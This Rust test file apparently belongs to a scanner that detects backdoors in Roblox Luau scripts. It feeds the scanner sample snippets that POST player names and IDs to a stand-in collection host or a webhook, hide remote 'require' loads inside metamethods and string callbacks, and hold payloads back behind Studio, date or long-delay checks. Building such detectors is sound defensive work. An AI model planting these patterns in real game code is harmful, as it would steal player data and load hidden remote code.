                "H:RequestAsync({{Url = \"https://collect.FAKE.example/x\", Method = \"POST\", Headers = {{[\"X-FAKE\"] = tostring({data})}}, Body = \"{{}}\"}})"
            )
        },
        |data| {
            format!(
                "local s = (\"%s\"):format(tostring({data}))\nH:PostAsync(\"https://collect.FAKE.example/x\", s)"
            )
        },
        |data| {
            format!(
                "local t = {{}}\nt.v = {data}\nH:PostAsync(\"https://collect.FAKE.example/x\", H:JSONEncode(t))"
            )
        },
        |data| {
            format!(
                "local function send(x) H:PostAsync(\"https://collect.FAKE.example/x\", tostring(x)) end\nsend({data})"
            )
        },
    ];
    let mut count = 0;
    for member in members {
        for flow in flows {
            let source = format!(
                "{HTTP}game:GetService(\"Players\").PlayerAdded:Connect(function(p)\n{}\nend)",
                flow(member)
            );
            expect(&source, &analysis(&source), "BG008", Severity::High, None);
            count += 1;
        }
    }
    assert_eq!(count, 48);
}

#[test]
fn item5_names_built_in_loops_stay_player_data() {
    for body in [
        "body = body .. p.Name .. \",\"",
        "body ..= p.DisplayName",
        "body = (\"%s,%s\"):format(body, p.Name)",
        "body = body .. tostring(p.UserId)",
        "table.insert(parts, p.Name)",
    ] {
        for list in [
            "game:GetService(\"Players\"):GetPlayers()",
            "ipairs(game:GetService(\"Players\"):GetPlayers())",
            "game.Players:GetPlayers()",
        ] {
            let source = format!(
                "{HTTP}local body, parts = \"\", {{}}\nfor _, p in {list} do {body} end\nH:PostAsync(\"https://collect.FAKE.example/x\", body .. table.concat(parts))"
            );
            expect(&source, &analysis(&source), "BG008", Severity::High, None);
        }
    }
}

#[test]
fn item5_player_data_in_other_places_is_not_bg008() {
    for source in [
        "local store = game:GetService(\"DataStoreService\"):GetDataStore(\"FAKE\")\ngame:GetService(\"Players\").PlayerAdded:Connect(function(p) store:SetAsync(p.DisplayName, {}) end)",
        "game:GetService(\"Players\").PlayerAdded:Connect(function(p) print(p.DisplayName, game.GameId, game.PrivateServerId) end)",
        "local label = Instance.new(\"TextLabel\")\nlabel.Text = game:GetService(\"Players\").LocalPlayer.DisplayName",
    ] {
        let result = analysis(source);
        assert!(
            result
                .findings
                .iter()
                .all(|finding| finding.rule_id != "BG008"),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

#[test]
fn item5_player_event_parameters_are_players_by_any_name() {
    for source in [
        "local function onJoin(p) H:PostAsync(\"https://collect.FAKE.example/x\", p.Name) end\ngame:GetService(\"Players\").PlayerAdded:Connect(onJoin)",
        "game:GetService(\"Players\").PlayerRemoving:Connect(function(who) H:PostAsync(\"https://collect.FAKE.example/x\", who.Name) end)",
        "game.Players.PlayerAdded:Once(function(x) H:PostAsync(\"https://collect.FAKE.example/x\", \"n=\" .. x.Name) end)",
        "local p = game:GetService(\"Players\").PlayerAdded:Wait()\nH:PostAsync(\"https://collect.FAKE.example/x\", p.Name)",
    ] {
        let source = format!("{HTTP}{source}");
        expect(&source, &analysis(&source), "BG008", Severity::High, None);
    }
    // Other events do not hand out players.
    let source = format!(
        "{HTTP}workspace.FAKE_Part.Touched:Connect(function(hit) H:PostAsync(\"https://collect.FAKE.example/x\", hit.Name) end)"
    );
    let result = analysis(&source);
    assert!(
        result
            .findings
            .iter()
            .all(|finding| finding.rule_id != "BG008"),
        "{:#?}",
        describe(&result.findings)
    );
}

// ----- item 6: callbacks and metamethods -----------------------------------------------

/// Every operator metamethod that hides a `require`, used with the table on either
/// side of the operator.
#[test]
fn item6_generated_operator_metamethods_are_followed() {
    let operators = [
        ("__add", "+"),
        ("__sub", "-"),
        ("__mul", "*"),
        ("__div", "/"),
        ("__idiv", "//"),
        ("__mod", "%"),
        ("__pow", "^"),
        ("__concat", ".."),
    ];
    let mut count = 0;
    for (metamethod, operator) in operators {
        for (side, expression) in [
            ("left", format!("m {operator} 999000000003500")),
            ("right", format!("999000000003500 {operator} m")),
            ("compound", format!("m {operator}= 999000000003500")),
        ] {
            let body = if side == "right" {
                "function(a, b) return require(a) end"
            } else {
                "function(a, b) return require(b) end"
            };
            let statement = if side == "compound" {
                expression
            } else {
                format!("local FAKE_r = {expression}")
            };
            let source =
                format!("local m = setmetatable({{}}, {{{metamethod} = {body}}})\n{statement}");
            let result = analysis(&source);
            assert!(
                result
                    .findings
                    .iter()
                    .any(|finding| finding.rule_id == "BG001"
                        && finding.severity == Severity::High
                        && finding.evidence.contains("999000000003500")),
                "{metamethod} {side}: {source}\n{:#?}",
                describe(&result.findings)
            );
            count += 1;
        }
    }
    assert_eq!(count, 24);
}

#[test]
fn item6_string_callbacks_and_iteration_forms_are_followed() {
    for (label, source) in [
        (
            "gsub callback",
            "(\"999000000003416\"):gsub(\"%d+\", function(s) require(tonumber(s)) end)",
        ),
        (
            "string.gsub callback",
            "string.gsub(\"FAKE 999000000003416\", \"(%d+)\", function(s) require(tonumber(s)) end)",
        ),
        (
            "gsub with require",
            "(\"999000000003416\"):gsub(\"%d+\", require)",
        ),
        (
            "gsub with a named callback",
            "local function load(s) require(tonumber(s)) end\n(\"id=999000000003416\"):gsub(\"id=(%d+)\", load)",
        ),
        (
            "gsub second match",
            "(\"FAKE 1 999000000003416\"):gsub(\"%d+\", function(s) if #s > 3 then require(tonumber(s)) end end)",
        ),
        (
            "gmatch loop",
            "for s in (\"FAKE 999000000003417\"):gmatch(\"%d+\") do require(tonumber(s)) end",
        ),
        (
            "gmatch captures",
            "for k, v in (\"id=999000000003417\"):gmatch(\"(%a+)=(%d+)\") do require(tonumber(v)) end",
        ),
        (
            "gmatch iterator called",
            "local it = (\"999000000003417\"):gmatch(\"%d+\")\nrequire(tonumber(it()))",
        ),
        (
            "next",
            "for _, id in next, {999000000003419} do require(id) end",
        ),
        (
            "next with nil",
            "for _, id in next, {a = 999000000003419}, nil do require(id) end",
        ),
        (
            "__index constant",
            "local cfg = setmetatable({}, {__index = function(_, k) return 999000000003003 end})\nrequire(cfg.anything)",
        ),
        (
            "__index table lookup",
            "local ids = {a = 999000000003004}\nlocal cfg = setmetatable({}, {__index = function(_, k) return ids.a end})\nrequire(cfg.FAKE_key)",
        ),
    ] {
        let result = analysis(source);
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "BG001" && finding.severity == Severity::High),
            "{label}: {:#?}",
            describe(&result.findings)
        );
    }
}

#[test]
fn item6_clean_callbacks_and_metamethods_stay_clean() {
    for source in [
        "local s = (\"hello world\"):gsub(\"%a+\", string.upper)\nprint(s)",
        "local words = {}\nfor w in (\"FAKE text here\"):gmatch(\"%a+\") do table.insert(words, w) end\nreturn words",
        "local Vec = {}\nVec.__index = Vec\nVec.__add = function(a, b) return setmetatable({x = a.x + b.x}, Vec) end\nlocal v = setmetatable({x = 1}, Vec) + setmetatable({x = 2}, Vec)\nreturn v.x",
        "local s = (\"a,b,c\"):gsub(\"(%w+)\", function(w) return w:upper() end)\nreturn s",
        "local Default = setmetatable({}, {__index = function(_, k) return 0 end})\nreturn Default.FAKE",
        "for k, v in next, {a = 1, b = 2} do print(k, v) end",
    ] {
        let result = analysis(source);
        assert!(
            result.findings.is_empty(),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 7: BG009 gates must control the risky action -------------------------------

fn gate_forms() -> Vec<(&'static str, &'static str)> {
    vec![
        (
            "not studio",
            "if not game:GetService(\"RunService\"):IsStudio() then {action} end",
        ),
        (
            "early return",
            "local rs = game:GetService(\"RunService\")\nif rs:IsStudio() then return end\n{action}",
        ),
        (
            "stored check",
            "local studio = game:GetService(\"RunService\"):IsStudio()\nif not studio then {action} end",
        ),
        (
            "stored method",
            "local rs = game:GetService(\"RunService\")\nlocal f = rs.IsStudio\nif not f(rs) then {action} end",
        ),
        (
            "DateTime",
            "if DateTime.now().UnixTimestamp > 1790000000 then {action} end",
        ),
        ("os.time", "if os.time() > 1790000000 then {action} end"),
        (
            "os.date",
            "if os.date(\"*t\").year >= 2027 then {action} end",
        ),
        ("tick", "if tick() > 1790000000 then {action} end"),
        (
            "creator",
            "if game.CreatorId ~= 999000000003600 then {action} end",
        ),
        (
            "place",
            "if game.PlaceId == 999000000003601 then {action} end",
        ),
        (
            "game",
            "if game.GameId ~= 999000000003605 then {action} end",
        ),
        (
            "empty job id",
            "if game.JobId == \"\" then return end\n{action}",
        ),
        (
            "player count",
            "if #game:GetService(\"Players\"):GetPlayers() >= 10 then {action} end",
        ),
        ("long wait", "task.wait(3600)\n{action}"),
        ("legacy wait", "wait(600)\n{action}"),
        (
            "scaled random wait",
            "task.wait(60 * math.random(10, 20))\n{action}",
        ),
        (
            "Random object wait",
            "local r = Random.new()\ntask.wait(r:NextInteger(600, 900))\n{action}",
        ),
        ("task.delay", "task.delay(86400, function() {action} end)"),
        ("legacy delay", "delay(7200, function() {action} end)"),
        (
            "wait loop",
            "while os.time() < 1790000000 do task.wait(60) end\n{action}",
        ),
        (
            "repeat until",
            "repeat task.wait(60) until os.time() > 1790000000\n{action}",
        ),
        (
            "helper function",
            "local function live() return not game:GetService(\"RunService\"):IsStudio() end\nif live() then {action} end",
        ),
        (
            "elseif",
            "if FAKE_x then print(1) elseif game.PlaceId == 999000000003606 then {action} end",
        ),
        (
            "else branch",
            "if game:GetService(\"RunService\"):IsStudio() then print(\"FAKE\") else {action} end",
        ),
        (
            "nested block",
            "if not game:GetService(\"RunService\"):IsStudio() then do local FAKE_x = 1 {action} end end",
        ),
        (
            "callback under a gate",
            "if not game:GetService(\"RunService\"):IsStudio() then game:GetService(\"Players\").PlayerAdded:Connect(function(p) {action} end) end",
        ),
    ]
}

fn risky_actions() -> Vec<&'static str> {
    vec![
        "require(999000000003602)",
        "game:GetService(\"InsertService\"):LoadAsset(999000000003603)",
        "loadstring(\"return 1\")()",
        "getfenv().FAKE = true",
        "game:GetService(\"HttpService\"):PostAsync(\"https://discord.com/api/webhooks/000/FAKE\", \"FAKE\")",
    ]
}

#[test]
fn item7_generated_gates_around_risky_actions_are_bg009() {
    let mut count = 0;
    for (gate, form) in gate_forms() {
        for action in risky_actions() {
            let source = form.replace("{action}", action);
            let result = analysis(&source);
            let gates = result
                .findings
                .iter()
                .filter(|finding| finding.rule_id == "BG009")
                .count();
            assert_eq!(
                gates,
                1,
                "{gate}: {source}\n{:#?}",
                describe(&result.findings)
            );
            count += 1;
        }
    }
    assert_eq!(count, 130);
}

#[test]
fn item7_gates_that_do_not_control_a_risky_action_are_quiet() {
    for source in [
        "if game:GetService(\"RunService\"):IsStudio() then print(\"FAKE debug\") end",
        "if not game:GetService(\"RunService\"):IsStudio() then require(script.Parent.FAKE_Module) end",
        "if not game:GetService(\"RunService\"):IsStudio() then require(FAKE_module) end",
        "local function isPlugin(o) return game:GetService(\"RunService\"):IsStudio() and o ~= nil end\nlocal function import(module) if not isPlugin(module) then print(\"FAKE\") end return require(module) end\nreturn import",
        "if game.PlaceId == 999000000003601 then print(\"FAKE\") end\nrequire(999000000003607)",
        "task.wait(1)\nrequire(999000000003608)",
        "if os.time() > 1790000000 then print(\"FAKE\") end\ngame:GetService(\"InsertService\"):LoadAsset(999000000003609)",
        "local RunService = game:GetService(\"RunService\")\nif RunService:IsStudio() then warn(\"FAKE would kick\") else game:GetService(\"Players\").LocalPlayer:Kick(\"FAKE\") end",
        "task.delay(3600, function() print(\"FAKE\") end)\nrequire(999000000003610)",
        "while true do task.wait(60) print(\"FAKE\") end",
    ] {
        let result = analysis(source);
        assert!(
            result
                .findings
                .iter()
                .all(|finding| finding.rule_id != "BG009"),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

#[test]
fn item7_delays_fold_arithmetic_and_ranges() {
    for (delay, gated) in [
        ("3600 * 24 * 7", true),
        ("math.random(600, 1200)", true),
        ("math.random(10, 1200)", false),
        ("30 + math.random(40, 50)", true),
        ("59", false),
        ("60", true),
    ] {
        let source = format!("task.wait({delay})\nrequire(999000000003611)");
        let result = analysis(&source);
        assert_eq!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "BG009"),
            gated,
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 8: long concatenations -----------------------------------------------------

fn text_chain(pieces: usize) -> String {
    let joined = (0..pieces)
        .map(|index| format!("\"Line {index} of the FAKE help text.\\n\""))
        .collect::<Vec<_>>()
        .join(" ..\n\t");
    format!("local M = {{}}\nM.help = {joined}\nreturn M\n")
}

#[test]
fn item8_long_text_concatenations_are_complete() {
    use bloxguard_core::analysis::MAX_CONCAT_OPERATORS;
    use bloxguard_core::config::Config;
    use bloxguard_core::engine;
    use bloxguard_core::model::Completeness;
    for pieces in [1_100, 4_000, MAX_CONCAT_OPERATORS] {
        let report = engine::scan_documents(
            vec![script_document(&text_chain(pieces))],
            &Config::default(),
        );
        assert_eq!(
            report.completeness,
            Completeness::Complete,
            "{pieces} pieces: {:?}",
            report.inputs[0].reasons
        );
    }
    // Shapes around the chain: names, calls, a table field and a require at the end.
    for source in [
        format!("local s = {}\nprint(s)", vec!["FAKE_a"; 5_000].join(" .. ")),
        format!(
            "local t = {{ text = {} }}\nreturn t",
            vec!["tostring(FAKE_x)"; 3_000].join(" .. ")
        ),
        format!(
            "require(tonumber({} .. \"999000000003700\"))",
            vec!["\"\""; 6_000].join(" .. ")
        ),
    ] {
        let report = engine::scan_documents(vec![script_document(&source)], &Config::default());
        assert_eq!(
            report.completeness,
            Completeness::Complete,
            "{:?}",
            report.inputs[0].reasons
        );
    }
    let result = analysis(&format!(
        "require(tonumber({} .. \"999000000003700\"))",
        vec!["\"\""; 6_000].join(" .. ")
    ));
    expect(
        "folded through a long chain",
        &result,
        "BG001",
        Severity::High,
        Some(Confidence::High),
    );
}

#[test]
fn item8_chains_above_the_cap_are_partial_with_a_reason() {
    use bloxguard_core::analysis::MAX_CONCAT_OPERATORS;
    for pieces in [MAX_CONCAT_OPERATORS + 2, 20_000] {
        let result = analysis(&text_chain(pieces));
        assert!(
            result.findings.is_empty()
                && result
                    .reasons
                    .iter()
                    .any(|reason| reason.contains("expression complexity")),
            "{pieces}: {:?}",
            result.reasons
        );
    }
    // Operators other than `..` keep their own cap, also next to a long chain.
    let mixed = format!(
        "return {} .. {}",
        vec!["1"; 1_100].join(" + "),
        vec!["\"a\""; 100].join(" .. ")
    );
    assert!(
        analysis(&mixed)
            .reasons
            .iter()
            .any(|reason| reason.contains("expression complexity"))
    );
}

/// The worst shape the caps allow at once must still fit the parser stack in the debug
/// build that runs these tests: brackets, operators and interpolations just under their
/// caps around a chain just under the concatenation cap.
#[test]
fn item8_concatenation_cap_leaves_stack_headroom() {
    use bloxguard_core::analysis::MAX_CONCAT_OPERATORS;
    let mut source = String::from("return ");
    source.push_str(&"(".repeat(880));
    source.push_str(&vec!["\"a\""; MAX_CONCAT_OPERATORS - 8].join(" .. "));
    source.push_str(" .. ");
    source.push_str(&vec!["1"; 1_000].join(" + "));
    source.push_str(" .. ");
    source.push_str(&"`{".repeat(120));
    source.push('1');
    source.push_str(&"}`".repeat(120));
    source.push_str(&")".repeat(880));
    let result = analysis(&source);
    assert!(result.reasons.is_empty(), "{:?}", result.reasons);
}

// ----- documentation claims ------------------------------------------------------------

#[test]
fn docs_bg004_loops_and_proxies_over_g_are_computed_global_calls() {
    for source in [
        "for k, v in next, _G do if k == FAKE_want then v(\"FAKE\") end end",
        "local env = setmetatable({}, {__index = function(_, k) return _G[k] end})\nenv[FAKE_k](\"FAKE\")",
    ] {
        expect(
            source,
            &analysis(source),
            "BG004",
            Severity::Medium,
            Some(Confidence::Medium),
        );
    }
}

#[test]
fn docs_values_shared_between_scripts_are_a_low_finding() {
    // Known limit: `_G` and `shared` values from other scripts are not followed.
    for source in [
        "task.wait(1)\nrequire(_G.FAKE_cfg)",
        "require(shared.FAKE.id)",
    ] {
        let result = analysis(source);
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.rule_id == "BG001" && finding.severity == Severity::Low),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
    // Known limit: a value captured by a closure that a factory returns.
    let result = analysis(
        "local function make(v) return function() return v end end\nlocal get = make(999000000003005)\nrequire(get())",
    );
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.rule_id == "BG001"),
        "{:#?}",
        describe(&result.findings)
    );
}

#[test]
fn docs_bg002_decoded_and_component_values_keep_their_origin() {
    let config = with_property(
        "FAKE_Cfg",
        "StringValue",
        "Value",
        serde_json::json!("{\"id\": 999000000003900}"),
    );
    let vector = with_property(
        "FAKE_V",
        "Vector3Value",
        "Value",
        serde_json::json!({"X": 999000.0, "Y": 3901.0, "Z": 0.0}),
    );
    for source in [
        "local H = game:GetService(\"HttpService\")\nrequire(H:JSONDecode(script.Parent.FAKE_Cfg.Value).id)",
        "local v = script.Parent.FAKE_V.Value\nrequire(v.X * 1e9 + v.Y)",
    ] {
        let mut document = bg002_model(source);
        let loader = document.instances.len() - 1;
        for mut instance in [config.clone(), vector.clone()] {
            instance.parent = Some(0);
            document.instances.insert(loader, instance);
        }
        let result = analyze_model(&document);
        expect(source, &result, "BG002", Severity::Critical, None);
    }
}

#[test]
fn docs_large_helpers_that_cannot_be_replayed_leave_the_table_changed() {
    let padding = lines(800, |index| format!("local FAKE_pad{index} = {index}"));
    let source = format!(
        "local cfg = {{id = {TR}}}\nlocal function setup(x)\n{padding}\nx.id = 999000000003901\nend\nsetup(cfg)\nrequire(cfg.id)"
    );
    assert!(source.len() > 16 * 1024);
    let result = trusted_analysis(&source);
    expect(
        "large helper",
        &result,
        "BG001",
        Severity::High,
        Some(Confidence::Medium),
    );
}

#[test]
fn docs_small_numbers_among_candidates_are_ignored() {
    let result = trusted_analysis(&format!("require(if FAKE_c then 5 else {TR})"));
    assert!(
        result.findings.is_empty(),
        "{:#?}",
        describe(&result.findings)
    );
    let result = analysis("require(if FAKE_c then 5 else 999000000003902)");
    assert!(
        result.findings.iter().all(
            |finding| !finding.evidence.contains("asset id candidate: 5")
                && !finding.evidence.contains("asset id: 5")
        ),
        "{:#?}",
        describe(&result.findings)
    );
    expect(
        "one ID among small numbers",
        &result,
        "BG001",
        Severity::High,
        Some(Confidence::High),
    );
}

// ----- follow-up: live metatables and more routes ---------------------------------------

/// A metatable is read when it is used, so a change after `setmetatable` counts.
#[test]
fn item1_metatable_changes_after_setmetatable_are_seen() {
    let x = "999000000004001";
    for (label, source) in [
        (
            "replaced __index",
            format!(
                "local mt = {{__index = {{id = {TR}}}}}\nlocal t = setmetatable({{}}, mt)\nmt.__index = {{id = {x}}}\nrequire(t.id)"
            ),
        ),
        (
            "write through getmetatable",
            format!(
                "local t = setmetatable({{}}, {{__index = {{id = {TR}}}}})\ngetmetatable(t).__index.id = {x}\nrequire(t.id)"
            ),
        ),
        (
            "rawset on the index table",
            format!(
                "local base = {{id = {TR}}}\nlocal t = setmetatable({{}}, {{__index = base}})\nrawset(base, \"id\", {x})\nrequire(t.id)"
            ),
        ),
        (
            "__index function added later",
            format!(
                "local mt = {{}}\nlocal t = setmetatable({{}}, mt)\nmt.__index = function() return {x} end\nrequire(t.id or {TR})"
            ),
        ),
        (
            "__call added later",
            format!(
                "local t = {{{TR}}}\nlocal mt = {{}}\nlocal fn = setmetatable({{}}, mt)\nmt.__call = function(_, list) list[1] = {x} end\nfn(t)\nrequire(t[1])"
            ),
        ),
        (
            "proxy reaches unknown code",
            format!(
                "local t = {{{TR}}}\nlocal proxy = setmetatable({{}}, {{__index = t}})\nFAKE(proxy)\nrequire(t[1])"
            ),
        ),
        (
            "object whose method changes a list",
            format!(
                "local t = {{{TR}}}\nlocal Obj = {{}}\nObj.__index = Obj\nfunction Obj.new(list) return setmetatable({{list = list}}, Obj) end\nfunction Obj:swap() self.list[1] = {x} end\nlocal o = Obj.new(t)\no:swap()\nrequire(t[1])"
            ),
        ),
    ] {
        let result = trusted_analysis(&source);
        expect(label, &result, "BG001", Severity::High, None);
    }
    // Copies and rebinding do not change the original. Since review round 4 a trusted
    // ID read from a table is still reported, so the original value shows up as the
    // trusted ID that was not applied, and the copy's new ID does not.
    for source in [
        format!("local t = {{{TR}}}\nlocal c = table.clone(t)\nc[1] = {x}\nrequire(t[1])"),
        format!("local t = {{{TR}}}\nlocal u = t\nu = {{}}\nu[1] = {x}\nrequire(t[1])"),
        format!("local t = setmetatable({{}}, {{__index = {{id = {TR}}}}})\nrequire(t.id)"),
    ] {
        let result = trusted_analysis(&source);
        only_trust_not_applied(&source, &result);
    }
}

/// The only findings are trusted IDs that trust did not remove, at medium confidence.
fn only_trust_not_applied(label: &str, result: &AnalysisResult) {
    assert!(
        !result.findings.is_empty()
            && result.findings.iter().all(|finding| {
                finding.confidence == Confidence::Medium
                    && finding
                        .evidence
                        .contains(&format!("trusted asset id, not a constant target: {TR}"))
            }),
        "{label}: {:#?}",
        describe(&result.findings)
    );
}

#[test]
fn item6_unary_and_tostring_metamethods_and_the_string_metatable_are_followed() {
    let x = "999000000004002";
    for (label, source) in [
        (
            "__unm",
            format!(
                "local m = setmetatable({{}}, {{__unm = function(a) return require({x}) end}})\nlocal _ = -m"
            ),
        ),
        (
            "__len",
            format!(
                "local m = setmetatable({{}}, {{__len = function(a) return require({x}) end}})\nlocal _ = #m"
            ),
        ),
        (
            "__tostring",
            format!(
                "local m = setmetatable({{}}, {{__tostring = function() return require({x}) end}})\nprint(tostring(m))"
            ),
        ),
        (
            "string metatable",
            format!("local sm = getmetatable(\"\").__index\n_G[sm.reverse(\"eriuqer\")]({x})"),
        ),
    ] {
        let result = analysis(&source);
        expect(
            label,
            &result,
            "BG001",
            Severity::High,
            Some(Confidence::High),
        );
    }
}

#[test]
fn item2_list_helpers_and_wait_for_child_timeouts() {
    for (label, source, confidence) in [
        (
            "next over children",
            "local _, v = next(script.Parent:GetChildren())\nrequire(v.Value)",
            Confidence::Low,
        ),
        (
            "unpack of children",
            "require((table.unpack(script.Parent:GetChildren())).Value)",
            Confidence::Low,
        ),
        (
            "numeric loop over children",
            "local kids = script.Parent:GetChildren()\nfor i = 1, #kids do require(kids[i].Value) end",
            Confidence::Low,
        ),
        (
            "WaitForChild with a timeout",
            "require(script.Parent:WaitForChild(\"FAKE_Id\", 5).Value)",
            Confidence::High,
        ),
    ] {
        let result = analyze_model(&bg002_model(source));
        expect(
            label,
            &result,
            "BG002",
            Severity::Critical,
            Some(confidence),
        );
    }
    // A missing child with a timeout is not a descendant search.
    let result = analyze_model(&bg002_model(
        "require(script.Parent:WaitForChild(\"FAKE_Missing\", 5).Value)",
    ));
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.message == OUTSIDE),
        "{:#?}",
        describe(&result.findings)
    );
}

#[test]
fn docs_bg004_metatables_on_global_environments_are_reported() {
    for source in [
        "setmetatable(_G, {__index = function(_, k) return FAKE_lookup(k) end})",
        "local env = _G\nsetmetatable(env, {__newindex = function() end})",
        "setmetatable(shared, {})",
        "local s = setmetatable\ns(_G, FAKE_meta)",
    ] {
        expect(
            source,
            &analysis(source),
            "BG004",
            Severity::High,
            Some(Confidence::High),
        );
    }
    let result = analysis("local t = setmetatable({}, {__index = _G})\nprint(t.FAKE)");
    assert!(
        result
            .findings
            .iter()
            .all(|finding| finding.rule_id != "BG004"),
        "{:#?}",
        describe(&result.findings)
    );
}
